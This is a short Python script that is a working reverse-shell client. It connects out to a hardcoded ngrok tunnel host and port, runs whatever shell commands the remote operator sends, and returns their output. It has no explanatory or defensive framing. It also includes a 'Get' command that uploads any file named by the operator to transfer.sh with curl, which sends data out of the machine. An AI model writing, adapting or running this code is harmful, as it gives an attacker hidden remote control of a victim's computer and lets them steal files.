# -------- name --------
name = "Hrushi"
# ----------------------
import time
import re
import os
import socket
import subprocess as sp

host = '0.tcp.ngrok.io'
port = 13862
headerLength = 100
# os.system('clear')

# recive msg for variable length
def recv(serv):
    # msg = "-"
    msg = serv.recv(headerLength).decode()
    # msg += '-'
    n = int(msg)
    msg = serv.recv(n).decode()
    return msg


# send message with header (size of msg)
def send(serv, msg):
    msg = f'{len(str(msg)):<{headerLength}}{msg}'
    serv.send(msg.encode())


# to remove flags and get input
# def fetchResults(cmd):
#     return re.split(r' -[\w]* ', cmd)[1:]






# start
try:
    serv = socket.socket()
    serv.connect((host, port))
    while True:
        msg = recv(serv)
        op = ''
        if msg == 'exit':
            continue
        elif re.match(r"^(sudo\s)?cd .*$", msg):
            try:
                os.chdir(msg[3:])
                op = 'Directory changed to - ' + sp.check_output('pwd', shell=True).decode()
            except:
                op = 'Invalid filepath'
        elif re.match(r'^(sudo)?cd$', msg):
            try:
                os.chdir(os.path.expanduser('~'))
                op = 'Directory changed to - ' + sp.check_output('pwd', shell=True).decode()
            except:
                op = 'Invalid filepath'
        elif (msg == 'hello'):
            send(serv, name)
            continue
        elif re.match(r'^Get .*',msg):
            cmd = "curl -T"+msg[4:]+" --silent -L transfer.sh/"+msg[4:]
            op = sp.check_output(cmd, shell=True).decode()
        else:
            try:
                op = sp.check_output(msg, shell=True).decode()
            except Exception as e:
                op = 'Invalid Command'

        if op == '':
            op = 'Command Executed'

        # serv.send(op)
        send(serv, op)
finally:
    serv.close()
